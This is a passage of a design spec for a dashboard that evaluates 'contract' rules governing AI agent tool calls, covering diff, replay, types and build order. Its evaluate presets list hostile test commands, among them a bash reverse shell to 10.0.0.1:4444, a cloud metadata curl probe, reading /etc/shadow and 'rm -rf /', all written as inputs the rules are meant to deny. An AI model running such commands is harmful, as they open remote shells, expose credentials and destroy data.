**Performance constraint:** Each event requires 2 API calls (old bundle eval + new bundle eval). Default limit: **50 events**. Show progress bar while running. Display "Based on 50 most recent events" in the results.

**Partial failure handling:** Track per-event eval errors separately. Display results like "42/50 evaluated successfully, 8 failed (parse error)". Show a collapsible section listing which events failed and why. One bad event must NOT fail the entire section — evaluate remaining events and show all successful results.

**v2 improvement (not in scope):** batch evaluate endpoint to reduce N+1 to 2 calls.

If the evaluate endpoint is not yet deployed, this section shows a placeholder: "Impact analysis requires the evaluate endpoint. [See setup guide]"

### 5.4 Section 3: YAML Diff (`diff-yaml.tsx`)

- `Collapsible` — collapsed by default (secondary view)
- Toggle: side-by-side or unified (small `Tabs` component)
- Uses `diff` npm package (already installed) for line-by-line diff
- Red/green line backgrounds with the light/dark color rule:
  - Added: `bg-emerald-500/15`
  - Removed: `bg-red-500/15`
- `ScrollArea` + `<pre>` with line numbers

### 5.5 Pre-population via URL

When navigating from Versions tab ("View full diff →"):
- URL: `?tab=diff&from=3&to=5`
- On mount, read `from` and `to` from `useSearchParams`, pre-populate selectors

### 5.6 States

**Loading:** `Loader2` per section (contract changes, impact, YAML diff load independently).
**Error:** Per-section error with retry.
**Empty (same version selected):** "Select two different versions to compare."

---

## 6. Tab 4: Evaluate — "Will this contract catch what I expect?"

### 6.1 Two Modes

Toggle between Manual and Replay via small `Tabs` at the top of the tab content.

### 6.2 Manual Mode (`evaluate-manual.tsx`)

**Contract source:**
- `Select` with deployed versions (default: latest) → fetches YAML via `getBundleYaml`
- OR "Paste custom YAML" → opens `Sheet` with `Textarea`

**Tool call builder:**
- Tool name: `Input` (text)
- Tool args: `Textarea` (JSON, monospace). Validate JSON on blur. Show error if invalid.
- Environment: `Select` with known environments
- Agent ID: `Input` with default "test-agent"
- Principal: `Collapsible` "Advanced" section — user_id, role, claims (JSON textarea)

**Presets:** `Select` dropdown. Two groups — basic (for devops-agent template) and advanced (for governance-v5):

*Basic:*
- "Read .env file" → `read_file`, `{ "path": "/home/.env" }`
- "Destructive bash" → `bash`, `{ "command": "rm -rf /" }`
- "Production deploy (developer)" → `deploy_service`, `{ "service": "api" }`, env=production, principal.role="developer"
- "Normal file read" → `read_file`, `{ "path": "/workspace/src/main.py" }`

*Advanced (governance-v5):*
- "Shell attack (reverse shell)" → `exec`, `{ "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" }`
- "Cloud metadata probe" → `exec`, `{ "command": "curl 169.254.169.254/latest/meta-data/" }`
- "File outside sandbox" → `read_file`, `{ "path": "/etc/shadow" }`
- "MCP tool call (approval)" → `mcp_slack`, `{ "action": "post_message", "channel": "#ops" }`
- "Allowed exec in workspace" → `exec`, `{ "command": "git status" }` (should be allowed)

**Evaluate button:** `Button` → calls `evaluateBundle()` → shows loading → displays result.

**Result display:**
- Large verdict badge: use `verdictColor` + `VerdictIcon` from `@/lib/verdict-helpers`
- `WOULD_DENY` for observe mode: `bg-amber-500/15 text-amber-600 dark:text-amber-400`
- Deciding contract ID + type
- Expanded message template
- Full pipeline trace: every contract evaluated, matched/not, effect
- Evaluation time: `{n}ms`

### 6.3 Replay Mode (`evaluate-replay.tsx`)

**Config:**
- Test bundle: `Select` (versions or "Custom YAML")
- Event source: `Select` — "Last 50 events" (default), "Last 24h (max 50)". Both cap at 50 events to keep API calls manageable (50 events × 2 versions = 100 calls). This limit is documented here as a v1 constraint; if needed, increase the cap by adjusting the `limit` parameter in `listEvents()`.
- Compare with: `Select` (baseline version)

**Run Replay:** Fetches events via `listEvents({ limit: 50 })`, evaluates each against both bundles, compares verdicts. Shows progress (`n/50 evaluated...`).

**Partial failure handling:** Same as §5.3 — track per-event errors, show successful results alongside failure count. Don't let one event's evaluation error abort the entire replay.

**Results:**
- Summary: N unchanged, N new denials, N relaxed
- Changed verdicts table (TanStack Table): tool call, agent, time (`formatRelativeTime`), old verdict → new verdict, causing contract
- Click row → expandable detail showing full eval trace for both versions

### 6.4 States

**Loading (manual):** `Loader2` on Evaluate button, disabled while running.
**Loading (replay):** Progress bar "Evaluating 23/50..."
**Error:** Inline error below result area. "Evaluation failed: {message}. [Retry]"
**Empty (no events for replay):** "No events found in the selected time range. Try running some agent tool calls first."
**Endpoint not available:** "The evaluate endpoint is not deployed yet. Check the server setup guide."

---

## 7. Page Shell (`contracts.tsx`)

```tsx
import { useState, useEffect, useCallback } from "react"
import { useSearchParams } from "react-router-dom"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Loader2 } from "lucide-react"
import { listBundles, getContractStats } from "@/lib/api"
import type { BundleWithDeployments, ContractCoverage } from "@/lib/api"
import { useDashboardSSE } from "@/hooks/use-dashboard-sse"
import { toast } from "sonner"

export function ContractsPage() {
  const [searchParams, setSearchParams] = useSearchParams()
  const activeTab = searchParams.get("tab") ?? "contracts"

  const [bundles, setBundles] = useState<BundleWithDeployments[]>([])
  const [coverage, setCoverage] = useState<ContractCoverage[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  const refresh = useCallback(async () => {
    try {
      const [b, s] = await Promise.all([listBundles(), getContractStats()])
      setBundles(b)
      setCoverage(s.coverage)
    } catch (e) {
      setError(e instanceof Error ? e.message : "Failed to load data")
    } finally {
      setLoading(false)
    }
  }, [])

  useEffect(() => { refresh() }, [refresh])

  useDashboardSSE({
    bundle_uploaded: (data) => {
      toast.success(`Version v${data.version} uploaded`)
      refresh()
    },
    contract_update: (data) => {
      toast.success(`v${data.version} deployed to ${data.env}`)
      refresh()
    },
  })

  const setTab = useCallback((tab: string) => {
    setSearchParams((prev) => {
      const next = new URLSearchParams(prev)
      next.set("tab", tab)
      return next
    })
  }, [setSearchParams])

  if (loading) {
    return (
      <div className="flex h-full items-center justify-center">
        <Loader2 className="size-6 animate-spin text-muted-foreground" />
      </div>
    )
  }

  return (
    <div className="space-y-6 p-6">
      {/* header + action buttons here */}
      <Tabs value={activeTab} onValueChange={setTab}>
        <TabsList variant="line">
          {/* Contracts, Versions, Diff, Evaluate triggers */}
        </TabsList>
        <TabsContent value="contracts">
          {/* <ContractsTab bundles={bundles} coverage={coverage} onRefresh={refresh} /> */}
        </TabsContent>
        <TabsContent value="versions">
          {/* <VersionsTab bundles={bundles} onRefresh={refresh} /> */}
        </TabsContent>
        <TabsContent value="diff">
          {/* <DiffTab bundles={bundles} /> */}
        </TabsContent>
        <TabsContent value="evaluate">
          {/* <EvaluateTab bundles={bundles} /> */}
        </TabsContent>
      </Tabs>
    </div>
  )
}
```

Note: The JSX comments above are placeholders showing where tab components go. Each tab is imported from `./contracts/`.

---

## 8. Types (`types.ts`)

```typescript
export type ContractType = "pre" | "post" | "session" | "sandbox"
export type Effect = "deny" | "approve" | "warn" | "redact"
export type Mode = "enforce" | "observe"

export type SideEffect = "pure" | "read" | "write" | "irreversible"

export interface ToolClassification {
  side_effect: SideEffect
}

export interface ContractBundle {
  apiVersion: "edictum/v1"
  kind: "ContractBundle"
  metadata: { name: string; description?: string }
  defaults: { mode: Mode }
  tools?: Record<string, ToolClassification>
  observe_alongside?: boolean
  contracts: ParsedContract[]
}

export interface ParsedContract {
  id: string
  type: ContractType
  enabled?: boolean
  mode?: Mode
  tool?: string
  tools?: string[]
  when?: Expression
  then?: ActionBlock
  // sandbox
  within?: string[]
  not_within?: string[]
  allows?: { commands?: string[]; domains?: string[] }
  not_allows?: { domains?: string[] }
  outside?: "deny" | "approve"
  message?: string
  // session
  limits?: {
    max_tool_calls?: number
    max_attempts?: number
    max_calls_per_tool?: Record<string, number>
  }
}

export interface ActionBlock {
  effect: Effect
  message: string
  tags?: string[]
  metadata?: Record<string, unknown>
  timeout?: number
  timeout_effect?: "deny" | "allow"
}

export type Expression =
  | { all: Expression[] }
  | { any: Expression[] }
  | { not: Expression }
  | Record<string, Record<string, unknown>>  // leaf: selector → operator → value

export interface ContractDiff {
  added: ParsedContract[]
  removed: ParsedContract[]
  modified: Array<{
    id: string
    old: ParsedContract
    new: ParsedContract
    changes: string[]  // human-readable change descriptions
  }>
  unchanged: string[]
}
```

### 8.1 YAML Parser (`yaml-parser.ts`)

Exports:

```typescript
import yaml from "js-yaml"
import type { ContractBundle, ContractDiff, ParsedContract } from "./types"

/** Parse raw YAML string into typed ContractBundle. Throws on invalid YAML or missing required fields. */
export function parseContractBundle(yamlString: string): ContractBundle

/** Validate YAML without full parse. Returns validation result for upload sheet. */
export function validateBundle(yamlString: string): {
  valid: boolean
  error?: string
  contractCount?: number
}

/** Compare two parsed bundles. Returns structured diff by contract ID. */
export function diffContracts(
  oldBundle: ContractBundle,
  newBundle: ContractBundle
): ContractDiff
```

**Schema reference:** Consult `~/project/edictum/docs/contracts/yaml-reference.md` for the full field reference when implementing `parseContractBundle`. All four contract types (pre, post, session, sandbox) have different valid field combinations.

---

## 9. Implementation Order

Each step is a working commit. Backend first, then frontend tab by tab.

### Phase 0: Cleanup

1. Amend `CLAUDE.md` Principle #2 with evaluate endpoint exception (see §1.3)
2. Delete `dashboard/src/components/contracts/` directory (v1 prototype)
3. Delete existing `dashboard/src/pages/contracts.tsx` (v1 prototype)
4. Remove all imports/routes referencing `@/components/contracts` in `App.tsx` or router config

### Phase 1: Backend + Foundation

5. `POST /api/v1/bundles/evaluate` endpoint
6. `GET /api/v1/stats/contracts` endpoint
7. `GET /api/v1/deployments` endpoint
8. `bundle_uploaded` SSE event
9. `pnpm dlx shadcn@latest add accordion sheet` (check sonner wrapper too)
10. `types.ts` + `yaml-parser.ts` in `pages/contracts/`
11. API client additions in `api/bundles.ts` + `api/stats.ts` + re-exports in `api/index.ts`
12. Page shell `contracts.tsx` (tab routing, data loading, SSE, URL sync)

### Phase 2: Tab 1 — Contracts

13. `contract-summary.tsx` — when-clause renderer
14. `contract-row.tsx` — single contract row
15. `contract-detail.tsx` — expanded detail
16. `bundle-header.tsx` — name, version selector, env badges, observe alongside
17. `contracts-tab.tsx` — Accordion by type, search, coverage indicators
18. `yaml-sheet.tsx` — YAML slide-out

### Phase 3: Tab 2 — Versions

19. `upload-sheet.tsx` — paste/drag-drop with validation + file type check
20. `deploy-dialog.tsx` — environment picker + confirmation
21. `version-detail.tsx` — right panel detail
22. `versions-tab.tsx` — two-panel list + detail

### Phase 4: Tab 3 — Diff

23. `diff-summary.tsx` — contract-level change summary
24. `diff-impact.tsx` — impact preview with event replay + partial failure handling
25. `diff-yaml.tsx` — text diff (collapsible, secondary)
26. `diff-tab.tsx` — orchestrator with version selectors

### Phase 5: Tab 4 — Evaluate

27. `evaluate-manual.tsx` — three-input mode
28. `evaluate-replay.tsx` — event replay comparison (TanStack Table, cap 50)
29. `evaluate-tab.tsx` — mode toggle + orchestrator

### Phase 6: Polish

30. Empty states for all tabs (per §3.9, §4.6, §5.6, §6.4)
31. Loading states for all tabs (per-section where applicable)
32. Error states with retry for all API calls
33. URL sync verified (`?tab=`, `?version=`, `?from=`, `?to=`)
34. SSE end-to-end verified (upload → toast, deploy → badge update)
35. Dark AND light mode screenshot verification
36. `PROMPT-FRONTEND-AUDIT.md` full checklist pass

---

## 10. Terminology (Binding)

| Use | DO NOT Use |
|-----|-----------|
| contract / contracts | rule, policy, guard, check |
| contract bundle | policy file, rule file |
| denied / deny | blocked, rejected |
| allowed / allow | passed, approved (except HITL) |
| version (v1, v2, v3) | — |
| deploy | promote, release |
| observe mode | shadow, dry run |
| finding | alert, violation |
| pipeline | engine, evaluator |
| evaluate | simulate, test (for the endpoint/feature name) |
| edictum instance | guard, enforcer |

---

## 11. Rules

- pnpm always
- No claude code mentions in commits
- React 19 + TypeScript strict mode, no `any`
- All `Record` types must have both type parameters (e.g., `Record<string, unknown>`, not bare `Record`)
- Functional components only
- shadcn/ui for ALL UI primitives — no raw `<button>`, `<input>`, `<select>`, `<label>`
- Tailwind for styling — no inline styles, no CSS modules
- Light/dark: `text-*-600 dark:text-*-400` for ALL colored text
- Badge opacity: `bg-*/15`, `border-*/30`
- Components < 200 lines
- TanStack Table for tabular data (replay results table only)
- Use shared modules (§1.6) — do not duplicate
- Spinners: `Loader2` from lucide-react
- Responsive: follow Events feed responsive pattern
